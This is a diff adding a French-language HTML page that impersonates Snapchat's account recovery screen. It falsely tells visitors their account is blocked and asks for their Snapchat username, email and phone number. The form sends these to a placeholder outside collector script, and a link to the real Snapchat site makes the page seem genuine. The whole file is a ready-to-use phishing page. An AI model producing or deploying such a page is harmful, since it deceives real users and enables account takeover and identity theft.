@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Reconnexion à Snapchat</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #121212;
+            padding: 30px 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #000;
+            text-align: center;
+            width: 300px;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="email"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #FF0000;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #FF1A1A;
+        }
+        a {
+            color: #FF0000;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Reconnexion à Snapchat</h2>
+        <p>Votre compte a été bloqué. Veuillez réinitialiser votre mot de passe.</p>
+        <form action="https://votre-url.com/recevoir-donnees.php" method="POST">
+            <label for="username">Nom d'utilisateur Snap</label>
+            <input type="text" id="username" name="username" placeholder="Entrez votre nom d'utilisateur" required>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" placeholder="Entrez votre email" required>
+
+            <label for="phone">Numéro de téléphone</label>
+            <input type="tel" id="phone" name="phone" placeholder="Entrez votre numéro de téléphone" required>
+
+            <button type="submit">Réinitialiser le mot de passe</button>
+        </form>
+        <p><a href="https://snapchat.com" target="_blank">Retour à la page officielle</a></p>
+    </div>
+</body>
+</html>
